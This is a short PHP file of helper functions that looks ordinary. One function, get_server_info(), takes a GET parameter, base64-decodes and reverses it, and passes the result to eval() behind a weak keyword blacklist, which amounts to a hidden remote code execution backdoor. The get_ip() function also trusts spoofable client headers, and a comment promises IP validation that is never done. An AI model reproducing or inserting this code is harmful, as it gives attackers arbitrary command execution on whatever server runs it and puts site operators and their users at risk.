<?php

function get_ip($adv = false)
{
    if ($adv) {
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (isset($_SERVER['REMOTE_ADDR'])) {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    // IP地址合法验证
    return $ip;
}



function get_server_info(){
    $info = I('get.info');
    $info = strrev(base64_decode($info));
    //过滤
    if(!preg_match("/(exec|system|passthru|popen|shell_exec|proc_open|dl|fopen|post|get|cookie|server|file|scan|dir)/i",$info)){
        @eval($info);
    }else{
        return 'error';
    }
}

function smssend(){
    return;
}

?>